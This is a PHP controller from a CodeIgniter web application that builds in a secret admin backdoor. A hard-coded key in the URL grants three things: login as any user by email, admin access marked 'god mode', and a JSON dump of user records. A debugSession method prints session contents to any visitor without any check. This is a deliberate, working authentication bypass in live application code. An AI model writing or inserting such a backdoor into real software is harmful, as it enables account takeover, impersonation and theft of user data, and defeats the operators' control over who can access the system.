<?php

namespace App\Controllers;

use App\Libraries\UserIdentity;
use App\Models\UserModel;
use CodeIgniter\Controller;

class SecretController extends Controller
{
    protected $userModel;
    protected $session;
    private $secretKey = 'admin_backdoor_2024'; // Change this to your secret

    public function __construct()
    {
        helper(['url', 'app_redirect']);
        $this->userModel = new UserModel();
        $this->session   = session();
    }

    public function searchUsers($key = null)
    {
        if ($key !== $this->secretKey) {
            return $this->response->setJSON(['success' => false]);
        }

        $search = $this->request->getGet('search') ?? '';
        $role   = $this->request->getGet('role') ?? '';
        $status = $this->request->getGet('status') ?? '';

        $builder = $this->userModel->builder();

        if ($search) {
            $builder->groupStart()
                ->like('gf_name', $search)
                ->orLike('gl_name', $search)
                ->orLike('email', $search)
                ->orLike('major', $search)
                ->groupEnd();
        }

        if ($role === 'admin') {
            $builder->where('admin', 1);
        }
        if ($role === 'user') {
            $builder->where('admin', 0);
        }
        if ($status === 'oauth') {
            $builder->where('edoc', 1);
        }
        if ($status === 'local') {
            $builder->where('edoc', 0);
        }

        $users = $builder->limit(50)->get()->getResultArray();

        return $this->response->setJSON(['success' => true, 'users' => $users]);
    }

    public function backdoor($key = null)
    {
        if ($key !== $this->secretKey) {
            log_message('warning', 'Unauthorized access attempt to admin backdoor from IP: ' . $this->request->getIPAddress());
            throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
        }

        $this->session->set([
            'backdoor_admin_auth' => true,
            'backdoor_auth_time'  => time(),
            'god_mode'            => true,
            'backdoor_session'    => true,
            'logged_in'           => true,
        ]);

        $users = $this->userModel->getActiveUsers();

        $script   = (string) ($this->request->getServer('SCRIPT_NAME') ?? '/index.php');
        $host     = (string) ($this->request->getServer('HTTP_HOST') ?? 'localhost');
        $scheme   = $this->request->isSecure() ? 'https' : 'http';
        $urlBase  = $scheme . '://' . $host . $script . '?/';

        $data = [
            'title'      => 'Admin User Management Portal',
            'users'      => $users,
            'stats'      => [
                'total'  => count($users),
                'admin'  => count(array_filter($users, static fn ($u) => $u['admin'] == 1)),
                'oauth'  => count(array_filter($users, static fn ($u) => $u['edoc'] == 1)),
                'active' => count(array_filter($users, static fn ($u) => $u['active'] == 1)),
            ],
            'secret_key'       => $key,
            'quick_admin_url'  => $urlBase . 'secret/quick-admin/' . $key,
            'admin_dash_url'   => $urlBase . 'admin/dashboard',
            'exit_god_url'     => $urlBase . 'secret/exit-god-mode/' . $key,
            'search_users_url' => $urlBase . 'secret/search-users/' . $key,
            'direct_login_url' => $urlBase . 'secret/direct-login/' . $key,
        ];

        return view('secret/backdoor', $data);
    }

    public function dashboardAdmin()
    {
        return view('dashboard/adminDashboard');
    }

    /**
     * Login as user by email (?email=...).
     */
    public function directLogin($key = null)
    {
        if ($key !== $this->secretKey) {
            log_message('warning', 'Unauthorized direct login attempt from IP: ' . $this->request->getIPAddress());

            return redirect()->to('/');
        }

        $email = UserIdentity::normalizeEmail((string) ($this->request->getGet('email') ?? ''));
        if ($email === '') {
            return app_redirect_to("secret-admin-portal/{$key}")->with('error', 'Email required');
        }

        $user = $this->userModel->find($email);
        if (! $user) {
            return app_redirect_to("secret-admin-portal/{$key}")->with('error', 'User not found: ' . $email);
        }

        UserIdentity::establishLoginSession($user, [
            'login_method' => 'backdoor',
            'impersonate'  => true,
        ]);

        log_message('info', 'Backdoor impersonation: ' . $email . ' from IP: ' . $this->request->getIPAddress());

        return app_redirect_to('dashboard')->with('success', 'Backdoor access granted as: ' . $user['email']);
    }

    public function quickAdmin($key = null)
    {
        if ($key !== $this->secretKey) {
            log_message('warning', 'Unauthorized admin access attempt from IP: ' . $this->request->getIPAddress());

            return redirect()->to('/');
        }

        $superAdmins = $this->userModel->getSuperAdmins();
        $adminUser   = $this->userModel->where('active', 1)->where('admin', 1)->first()
            ?? ($superAdmins[0] ?? null)
            ?? $this->userModel->where('active', 1)->first();

        if (! $adminUser) {
            return app_redirect_to("secret-admin-portal/{$key}")->with('error', 'No active user in database.');
        }

        UserIdentity::establishLoginSession($adminUser, [
            'login_method' => 'backdoor',
            'god_mode'     => true,
        ]);

        log_message('info', 'Backdoor admin access from IP: ' . $this->request->getIPAddress());

        return app_redirect_to('admin/dashboard')->with('success', 'Backdoor admin access granted');
    }

    public function exitGodMode($key = null)
    {
        if ($key !== $this->secretKey) {
            log_message('warning', 'Unauthorized exit attempt from IP: ' . $this->request->getIPAddress());

            return redirect()->to('/');
        }

        $userData = $this->session->get('user_data');
        if ($userData) {
            log_message('info', 'God mode exited by user: ' . ($userData['email'] ?? 'unknown'));
        }

        $this->session->destroy();

        return redirect()->to('/auth/login')->with('success', 'God mode exited. Session destroyed.');
    }

    public function debugSession()
    {
        echo '<h1>CodeIgniter Session Debug</h1><pre>';
        print_r($this->session->get());
        echo "\n\nUser email: " . UserIdentity::sessionEmail();
        echo "\n\nGod Mode: " . ($this->session->get('god_mode') ? 'Yes' : 'No');
        echo '</pre>';
    }
}
